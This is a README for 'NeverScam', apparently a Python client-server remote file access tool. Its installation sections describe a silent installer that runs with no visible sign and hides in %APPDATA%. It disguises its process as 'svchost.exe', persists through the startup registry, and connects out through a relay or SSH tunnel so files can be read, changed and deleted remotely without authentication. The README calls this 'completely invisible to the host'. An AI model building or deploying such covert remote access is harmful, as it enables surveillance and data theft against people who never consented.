# NeverScam Remote File Access Tool

A client-server application that allows remote access to files on a host computer from a user's device, providing a desktop-like file management experience.

## Features

- **Remote File Management**: View, edit, create, delete, rename, and copy files and folders remotely
- **Directory Navigation**: Tree view for browsing directories and list view for files
- **File Editing**: Built-in text editor for viewing and modifying text files
- **File Operations**: Upload local files to remote server, download remote files
- **Search Functionality**: Search for files and directories
- **File Properties**: View file size, modification date, and other properties
- **Themes**: Light and dark theme support
- **Context Menu**: Right-click menu for quick actions
- **Keyboard Shortcuts**: Common shortcuts for efficient navigation

## Requirements

- Python 3.6+
- For host (server): Only Python required - no external dependencies needed (uses built-in modules only)
- For client: Windows (for .exe), or any OS with Python for testing
- Dependencies: Pillow (for image preview), PyInstaller (for building .exe) - only for the client

## Installation

### Silent Installer (Single File - Most Stealthy)

**Recommended for complete invisibility**

1. Build the installer on any Windows machine:
   ```
   build-installer.bat
   ```
   This creates `dist/NeverScamInstaller.exe` (single .exe file)

2. Copy `NeverScamInstaller.exe` to the host computer

3. Run it - **nothing appears, no windows, no messages**

**Result:** Server installs to hidden location, runs at startup, and connects to PartyKit relay - completely invisible to the host.

### One-Click Host Setup (Visible but easy)

1. Download the repository
2. On the host computer, double-click `auto-install.bat`
3. That's it! The server will:
   - Install to a hidden location (%APPDATA%\NeverScam)
   - Copy pythonw.exe as "svchost.exe" to disguise the process
   - Add to Windows startup registry
   - Start immediately hidden

**Note:** After installation, no files or applications are visible. The server runs completely hidden (appears as "svchost.exe" in Task Manager) and starts automatically on every boot.

### PartyKit Relay Setup (Free Remote Access Without Port Forwarding)

For accessing hosts across different networks without port forwarding, use the PartyKit relay:

1. **Deploy PartyKit Relay Server (Free, No Credit Card)**
   - Sign up at https://partykit.io
   - Upload `partykit-relay.js` and `partykit.json`
   - Deploy: `partykit deploy`
   - Copy your relay URL (e.g., `https://neverscam-relay.username.partykit.dev`)

2. **Configure Host**
   - Edit `silent-install.py` and change `PARTYKIT_URL` to your relay URL
   - Run `build-installer.bat` to create `NeverScamInstaller.exe`
   - Host runs the installer - connects to PartyKit automatically on boot

3. **Configure Client**
   - Edit `main.py` to add PartyKit relay URL option
   - Connect through PartyKit relay

See `PARTYKIT_GUIDE.md` for detailed instructions.

### Manual Setup (Alternative)

1. Clone or download the repository
2. Run `setup.bat` on the host computer

### Remote Access (Different Networks)

For accessing hosts across different networks:

**Option 1: PartyKit Relay (Recommended - Free, No Credit Card)**
- Deploy PartyKit relay server (see above)
- Host automatically connects to relay
- Client connects through same relay
- No port forwarding needed

**Option 2: SSH Tunnel (Serveo.net)**
- Both installers automatically set up SSH tunnel using Serveo.net (free, no signup)
- Host gets a URL like: `https://randomname.serveo.net`
- Use this URL on client to connect

### Client Installation

1. Install dependencies for the client:
   ```
   pip install -r requirements.txt
   ```

### Running the Client

#### Local Network (Same WiFi)

Use `main.py` - client auto-discovers server via UDP broadcast

#### Remote Access (Different Networks)

**PartyKit Mode:**
- Connect through PartyKit relay URL

**Serveo Mode:**
- Enter the Serveo URL when prompted instead of IP address

### File Operations

- **Navigation**: Use the tree view on the left to browse directories, click to select
- **View Files**: Double-click files in the list to open in the text editor
- **Edit Files**: Modify content in the text editor and save
- **Create**: Use menu File > New File/Folder or buttons
- **Delete**: Select item and press Delete key or use context menu
- **Rename**: Select item and use F2 or context menu
- **Copy/Paste**: Select item, copy, then paste in another directory
- **Upload**: Use File > Upload to send local files to remote server
- **Search**: Type in search box to filter files
- **Properties**: Right-click > Properties to view file details

### Keyboard Shortcuts

- Ctrl+N: New file
- Ctrl+Shift+N: New folder
- Ctrl+O: Open file
- Ctrl+S: Save file
- F2: Rename
- Delete: Delete item
- Ctrl+C: Copy
- Ctrl+V: Paste
- Ctrl+F: Focus search

## Security

- The server only allows access to files within the user's home directory
- All paths are sanitized to prevent directory traversal attacks
- No authentication is implemented - use at your own risk on secure networks
- For production use, consider adding authentication and encryption

## Troubleshooting

- **Connection failed**: Check server is running and firewall settings
- **Permission denied**: Server may not have access to certain directories
- **Binary files**: Only text files can be edited/uploaded; binary files show as images if possible
- **Server not responding**: Ensure server.py is running (check Task Manager for svchost.exe)
- **PartyKit not connecting**: Verify relay URL is correct in silent-install.py

## Development

- Server: `server.py` - Lightweight socket server with UDP discovery
- Client: `main.py` - Tkinter GUI application with auto-discovery
- Relay Server: `partykit-relay.js` - PartyKit WebSocket relay for remote access
- Dependencies: `requirements.txt`
- Tasks: `TODO.md`
- Installers:
  - `silent-install.py` - Single-file installer (can be compiled to .exe)
  - `build-installer.bat` - Build script for single-file .exe
  - `auto-install.bat` - Batch script alternative

## License

This project is for educational purposes. Use responsibly.

